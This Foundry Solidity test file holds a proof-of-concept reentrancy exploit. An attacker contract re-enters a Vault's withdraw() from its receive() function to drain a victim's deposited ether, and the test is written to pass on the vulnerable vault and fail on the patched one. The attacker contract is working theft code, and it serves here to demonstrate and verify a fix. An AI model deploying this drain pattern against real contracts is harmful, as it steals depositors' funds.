// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

/// @dev Reenters withdraw() from receive(). The inner call's result is ignored so the
///      exploit completes either way: on the patched vault the reentrant call reverts
///      (balance already zeroed) and the attacker keeps only its own deposit, making the
///      assertions below fail; on the vulnerable vault it drains everyone's funds.
contract ReentrancyAttacker {
    Vault public vault;
    uint256 public deposited;

    constructor(Vault v) {
        vault = v;
    }

    function attack() external payable {
        deposited = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= deposited) {
            (bool ignored,) = address(vault).call(abi.encodeWithSignature("withdraw()"));
            ignored; // reentry reverts on a patched vault; ignore and let the exploit finish
        }
    }
}

/// @notice PoC: passes on the ORIGINAL (vulnerable) Vault, fails on the PATCHED one.
contract PocTest is Test {
    Vault internal vault;
    address internal victim = makeAddr("victim");
    ReentrancyAttacker internal attacker;

    function setUp() public {
        vault = new Vault();

        // An honest user parks 5 ether in the vault.
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();

        attacker = new ReentrancyAttacker(vault);
        vm.deal(address(this), 1 ether);
    }

    function test_reentrancyDrainsVault() public {
        attacker.attack{value: 1 ether}();

        // On the vulnerable vault the attacker walks away with the victim's 5 ether too.
        assertEq(vault.totalAssets(), 0, "vault fully drained");
        assertGt(address(attacker).balance, 1 ether, "attacker stole more than it deposited");
    }
}
